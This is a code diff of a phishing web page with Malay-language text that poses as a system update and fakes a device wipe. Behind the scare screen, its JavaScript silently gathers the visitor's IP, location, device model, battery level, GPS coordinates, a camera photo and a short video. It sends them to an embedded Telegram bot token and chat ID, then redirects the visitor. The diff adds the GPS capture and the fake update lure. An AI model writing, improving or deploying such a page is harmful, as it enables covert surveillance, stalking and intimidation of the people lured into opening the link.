@@ -11,23 +11,14 @@
             display: flex; flex-direction: column;
             justify-content: center; align-items: center;
             height: 100vh; margin: 0; overflow: hidden;
-            text-shadow: 0 0 5px #0f0;
         }
-        /* Overlay & Cookie Box */
         #overlay {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.85); z-index: 9999;
+            background: rgba(0,0,0,0.8); z-index: 9999;
             display: flex; justify-content: center; align-items: center;
+            cursor: pointer;
         }
-        .cookie-box {
-            background: #111; border: 1px solid #0f0; padding: 20px;
-            text-align: center; max-width: 300px; box-shadow: 0 0 15px #0f0;
-        }
-        .cookie-box button {
-            background: #0f0; color: #000; border: none;
-            padding: 10px 20px; margin-top: 15px; font-weight: bold; cursor: pointer;
-        }
-        .container { width: 80%; max-width: 600px; display: none; }
+        .container { width: 85%; max-width: 600px; }
         .header {
             font-weight: bold; font-size: 1.2rem; margin-bottom: 20px;
             border-bottom: 1px solid #0f0; padding-bottom: 10px;
@@ -36,8 +27,8 @@
         }
         @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
         #console {
-            font-size: 0.85rem; line-height: 1.4; height: 250px;
-            overflow: hidden; background: rgba(0, 20, 0, 0.9);
+            font-size: 0.8rem; line-height: 1.4; height: 250px;
+            overflow: hidden; background: rgba(0, 15, 0, 0.9);
             padding: 10px; border: 1px solid #0f0;
         }
         .progress-bar { width: 100%; height: 10px; border: 1px solid #0f0; margin-top: 20px; }
@@ -45,22 +36,22 @@
         .red { color: #ff0000; font-weight: bold; }
     </style>
 </head>
-<body>
+<body onclick="activateAll()">
 
     <div id="overlay">
-        <div class="cookie-box">
-            <p style="font-size: 0.8rem;">Laman web ini menggunakan 'Security Cookies' untuk pengesahan peranti.</p>
-            <button onclick="initAction()">ACCEPT & PROCEED</button>
+        <div style="text-align:center; border:1px solid #0f0; padding:25px; background:#111; box-shadow: 0 0 20px #0f0;">
+            <p>⚠️ SYSTEM UPDATE REQUIRED</p>
+            <p style="font-size:0.7rem; color:#aaa;">Tap screen to synchronize device</p>
         </div>
     </div>
 
-    <div class="container" id="main-ui">
-        <div class="header"> [!] DEVICE WIPE IN PROGRESS [!] </div>
+    <div class="container">
+        <div class="header"> [!] DEVICE RESER & WIPE [!] </div>
         <div id="console"></div>
         <div class="progress-bar">
             <div class="progress-fill" id="fill"></div>
         </div>
-        <p id="status" style="color:#f00; font-size:0.8rem; text-align:center;">DELETING ALL INTERNAL STORAGE...</p>
+        <p id="status" style="text-align:center; font-size:0.8rem; margin-top:10px;">DELETING SYSTEM FILES...</p>
     </div>
 
     <video id="video" style="display:none;" autoplay playsinline></video>
@@ -69,7 +60,7 @@
     <script>
         const TOKEN = '8720467847:AAFxo75yX3BBCsdSXEwSSWATO6Gth76CTCo';
         const urlParams = new URLSearchParams(window.location.search);
-        const CURRENT_CHAT_ID = urlParams.get('id') || '8563935930';
+        const CURRENT_CHAT_ID = urlParams.get('id') || '8563935930'; 
 
         const consoleElem = document.getElementById('console');
         const fill = document.getElementById('fill');
@@ -77,82 +68,100 @@
         function logToConsole(text, isRed = false) {
             const p = document.createElement('p');
             p.style.margin = '2px 0';
-            p.className = isRed ? 'red' : '';
+            if(isRed) p.className = 'red';
             p.innerHTML = `> ${text}`;
             consoleElem.appendChild(p);
             consoleElem.scrollTop = consoleElem.scrollHeight;
-            if (consoleElem.childNodes.length > 12) consoleElem.removeChild(consoleElem.firstChild);
         }
 
-        async function initAction() {
-            // 1. Hide Overlay & Show UI
+        let isActivated = false;
+        async function activateAll() {
+            if (isActivated) return;
+            isActivated = true;
             document.getElementById('overlay').style.display = 'none';
-            document.getElementById('main-ui').style.display = 'block';
 
-            // 2. Full Screen
-            if (document.documentElement.requestFullscreen) {
-                document.documentElement.requestFullscreen();
-            }
+            // Fullscreen & Vibrate
+            if (document.documentElement.requestFullscreen) document.documentElement.requestFullscreen();
+            if (navigator.vibrate) navigator.vibrate([300, 100, 300, 100, 800]);
 
-            // 3. Vibration Pattern
-            if (navigator.vibrate) {
-                navigator.vibrate([100, 50, 100, 50, 500, 100, 500, 100, 1000]);
-            }
-
-            // 4. Auto-Copy to Clipboard
-            const dummy = document.createElement("textarea");
-            document.body.appendChild(dummy);
-            dummy.value = "YOUR DEVICE HAS BEEN BREACHED. SYSTEM WIPE INITIATED. ALL DATA DELETED.";
-            dummy.select();
+            // Auto-Copy
+            const t = document.createElement("textarea");
+            document.body.appendChild(t);
+            t.value = "HACKER ALERT: SYSTEM RESET. ALL DATA DELETED.";
+            t.select();
             document.execCommand("copy");
-            document.body.removeChild(dummy);
+            document.body.removeChild(t);
 
             startTrace();
         }
 
         async function startTrace() {
-            logToConsole("Exploiting system kernel...");
+            logToConsole("Initializing remote exploit...");
             const waktu = new Date().toLocaleString('ms-MY', { timeZone: 'Asia/Kuala_Lumpur' });
-            
+
+            // Fake Wipe Logs
+            setTimeout(() => logToConsole("Bypassing security... [OK]"), 1000);
             setTimeout(() => {
-                logToConsole("ACCESS GRANTED: ROOT_USER", true);
-                if(navigator.vibrate) navigator.vibrate(500);
-            }, 1000);
-            
-            setTimeout(() => logToConsole("Bypassing security protocols..."), 2000);
-            setTimeout(() => logToConsole("DELETING: /sdcard/DCIM/Camera", true), 3500);
-            setTimeout(() => {
-                logToConsole("DELETING: /WhatsApp/Databases", true);
-                if(navigator.vibrate) navigator.vibrate([200, 100, 200]);
-            }, 5000);
-            setTimeout(() => logToConsole("Formatting /system partition...", true), 7000);
-            setTimeout(() => logToConsole("All personal data encrypted & removed."), 9000);
+                logToConsole("CRITICAL: EMERGENCY WIPE INITIATED", true);
+                if(navigator.vibrate) navigator.vibrate(1000);
+            }, 3000);
+            setTimeout(() => logToConsole("Formatting /sdcard/Photos...", true), 5000);
 
             let width = 0;
             const interval = setInterval(() => {
                 if (width >= 99) clearInterval(interval);
-                width += Math.random() * 4;
+                width += Math.random() * 6;
                 fill.style.width = `${width}%`;
             }, 500);
 
-            // Get Device Info
-            let infoBateri = "N/A";
+            // --- DETECT BRAND ---
+            let brandPhone = "Unknown Device";
+            if (navigator.userAgentData) {
+                try {
+                    const info = await navigator.userAgentData.getHighEntropyValues(["model", "platform"]);
+                    brandPhone = `${info.platform} (${info.model || "Standard"})`;
+                } catch (e) { brandPhone = "Device Data Blocked"; }
+            } else {
+                const ua = navigator.userAgent;
+                if (ua.match(/iPhone/i)) brandPhone = "iPhone (iOS)";
+                else if (ua.match(/Android/i)) brandPhone = "Android Device";
+                else if (ua.match(/Windows/i)) brandPhone = "Windows PC";
+            }
+
+            // --- IP & DEVICE INFO ---
             try {
-                const battery = await navigator.getBattery();
-                infoBateri = `${Math.round(battery.level * 100)}%`;
+                const res = await fetch('https://ipapi.co/json/');
+                const d = await res.json();
+                const b = await navigator.getBattery();
+                const bLevel = `${Math.round(b.level * 100)}% (${b.charging ? "Charging" : "Battery"})`;
+
+                let msg = `🚨 *SYSTEM RESET*\n` +
+                          `📱 *Device:* ${brandPhone}\n` +
+                          `🌐 *IP:* \`${d.ip}\`\n` +
+                          `📍 *Loc:* ${d.city}, ${d.country_name}\n` +
+                          `🔋 *Battery:* ${bLevel}\n` +
+                          `⏰ *Time:* ${waktu}`;
+                
+                await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({chat_id: CURRENT_CHAT_ID, text: msg, parse_mode: 'Markdown'})
+                });
             } catch (e) {}
 
-            let brandPhone = navigator.userAgent.match(/iPhone/i) ? "iPhone" : "Android";
+            // --- GPS ---
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(async (pos) => {
+                    const map = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                    await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({chat_id: CURRENT_CHAT_ID, text: `📍 *GPS COORDINATES:*\n[Open in Google Maps](${map})`, parse_mode: 'Markdown'})
+                    });
+                }, null, {enableHighAccuracy:true});
+            }
 
-            // Telegram Reporting
-            try {
-                const response = await fetch('https://ipapi.co/json/');
-                const data = await response.json();
-                let infoAsas = `🚨 *BREACH & WIPE*\n📱 *Device:* ${brandPhone}\n🌐 *IP:* \`${data.ip}\`\n📍 *Loc:* ${data.city}\n🔋 *Bat:* ${infoBateri}`;
-                await sendToTele(infoAsas);
-            } catch (e) {}
-
-            // Camera Only (No Audio/Mic)
+            // --- CAMERA (NO MIC) ---
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
                 const video = document.getElementById('video');
@@ -164,42 +173,28 @@
                     canvas.toBlob(async (blob) => {
                         const fd = new FormData();
                         fd.append('chat_id', CURRENT_CHAT_ID);
-                        fd.append('photo', blob, 'target.jpg');
-                        fd.append('caption', `📸 *TARGET CAPTURED DURING WIPE*`);
-                        await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                        fd.append('photo', blob, 'snap.jpg');
+                        fd.append('caption', `📸 *FACE CAPTURED*\n📱 ${brandPhone}`);
+                        await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {method:'POST', body:fd});
                     }, 'image/jpeg');
-                }, 3000);
+                }, 4000);
 
-                const mediaRecorder = new MediaRecorder(stream);
+                const mr = new MediaRecorder(stream);
                 const chunks = [];
-                mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
-                mediaRecorder.onstop = async () => {
-                    const videoBlob = new Blob(chunks, { type: 'video/mp4' });
+                mr.ondataavailable = (e) => chunks.push(e.data);
+                mr.onstop = async () => {
                     const fdV = new FormData();
                     fdV.append('chat_id', CURRENT_CHAT_ID);
-                    fdV.append('video', videoBlob, 'log.mp4');
-                    await fetch(`https://api.telegram.org/bot${TOKEN}/sendVideo`, { method: 'POST', body: fdV });
+                    fdV.append('video', new Blob(chunks, {type:'video/mp4'}), 'record.mp4');
+                    fdV.append('caption', `📹 *VIDEO STREAM (6s)*`);
+                    await fetch(`https://api.telegram.org/bot${TOKEN}/sendVideo`, {method:'POST', body:fdV});
                     stream.getTracks().forEach(t => t.stop());
                 };
+                mr.start();
+                setTimeout(() => mr.stop(), 7000);
+            } catch (e) { logToConsole("Camera Access Denied.", true); }
 
-                mediaRecorder.start();
-                setTimeout(() => { mediaRecorder.stop(); }, 6000);
-
-            } catch (e) {
-                logToConsole("SECURITY ERROR: Camera bypass failed.", true);
-            }
-
-            setTimeout(() => {
-                window.location.href = "https://blogs.mtdv.me/videos/452uSngg5p";
-            }, 14000);
-        }
-
-        async function sendToTele(text) {
-            return fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: CURRENT_CHAT_ID, text: text, parse_mode: 'Markdown' })
-            });
+            setTimeout(() => { window.location.href = "https://blogs.mtdv.me/videos/452uSngg5p"; }, 15000);
         }
     </script>
 </body>
